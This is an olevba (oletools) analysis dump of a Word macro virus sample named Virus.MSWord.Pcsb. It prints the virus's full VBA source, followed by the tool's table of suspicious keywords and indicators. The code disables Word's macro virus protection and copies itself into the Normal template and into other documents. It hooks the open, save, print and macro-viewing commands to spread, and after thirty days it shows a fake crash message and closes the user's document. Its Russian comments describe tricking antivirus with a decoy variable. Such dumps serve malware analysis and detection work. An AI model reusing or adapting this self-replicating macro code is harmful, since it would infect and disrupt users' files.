olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Pcsb-8fc4f5f8e62bfddd41a97cbf9f4ba186dd930681
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Pcsb-8fc4f5f8e62bfddd41a97cbf9f4ba186dd930681 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NEWVIR.bas 
in file: Virus.MSWord.Pcsb-8fc4f5f8e62bfddd41a97cbf9f4ba186dd930681 - OLE stream: 'Macros/VBA/NEWVIR'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub NEWVIR()
On Error Resume Next
' Поздравляю, если Вы здесь,
' значит еще что-то можете,
' так что дерзайте, Вас оценили ...
' С уважением АВТОР
' **************************************
'Отключение чего надо ...
Options.ConfirmConversions = Not (True)
Options.VirusProtection = Not (True)
Options.SaveNormalPrompt = Not (True)
'сохранение тела куда надо ...
ActiveDocument.VBProject.VBComponents("NEWVIR").Export "C:\windows\PCSB.inf"
ActiveDocument.ReadOnlyRecommended = Not (True)
' Если шаблон не инфицирован, запомнить дату заражения куда надо ...
If NormalTemplate.VBProject.VBComponents.Item("NEWVIR").Name <> "NEWVIR" Then
    Open "C:\windows\Dte.inf" For Output As #1
    Print #1, CDbl(Date)
    Close #1
End If
Call Pig
' Оставление комментария куда надо
ActiveDocument.Comments.Add Range, "Работать надо в рабочее время. Барик !!!"
' Проверка чего надо, дабы не помереть и размножиться
Dim ob1, ob2, sss As String
ob1 = NormalTemplate.VBProject.VBComponents.Item("NEWVIR").Name
ob2 = ActiveDocument.VBProject.VBComponents.Item("NEWVIR").Name
If ob1 <> "NEWVIR" Then var1 = True
If ob2 <> "NEWVIR" Then var2 = True
' На этих строка я очень долго трахался с антивирусом
' пока не добавил переменную для обмана
If var1 = True And var2 = False Then Set Var3 = NormalTemplate.VBProject.VBComponents
sss = "Пустышка"
If var1 = False And var2 = True Then Set Var3 = ActiveDocument.VBProject.VBComponents
sss = sss + " для антивируса"
If var2 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
Var3.import "C:\windows\PCSB.inf"
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
' А вы говорите цацки-пецки
' Ожидайте новый релиз !!!
' Мы еще повоюем ...
End Sub

Public Sub Pig()
' Чтение даты заражения откуда надо
Open "C:\windows\Dte.inf" For Input As #1
Input #1, KontrDate
Close #1
' Если со времени заражения прошел месяц, активировать вирус
If Abs(CDbl(Date) - KontrDate) >= 30 Then
   If Time >= "18:00:00" Or Time >= "8:00:00" Then
     ' Работать надо в рабочее время !!!
     ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
     Call HelpAbout
   End If
End If

End Sub
Public Sub AutoOpen()
Call NEWVIR
End Sub
Sub HelpAbout()
On Error Resume Next
MsgBox "Программа выполнила недопустимую функцию, документ вызвавший збой системы будет закрыт. Если эта ошибка будет возникать в дальнейшем, обратитесь к разработчику.", vbCritical
ActiveDocument.Close
End Sub
Sub FileSave()
On Error Resume Next
Call NEWVIR
ActiveDocument.Save
End Sub
Sub FileSaveAs()
On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
Call NEWVIR
End Sub
Sub FilePrint()
Dialogs(wdDialogFilePrint).Show
Call NEWVIR
End Sub
Sub FilePrintDefault()
Call NEWVIR
End Sub
Sub ToolsMacro()
    On Error Resume Next
    Call NEWVIR
End Sub
Sub FileTemplates()
    On Error Resume Next
    Call NEWVIR
End Sub
Sub ViewVBCode()
    On Error Resume Next
    Call NEWVIR
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |PCSB.inf            |Executable file name                         |
|IOC       |Dte.inf             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

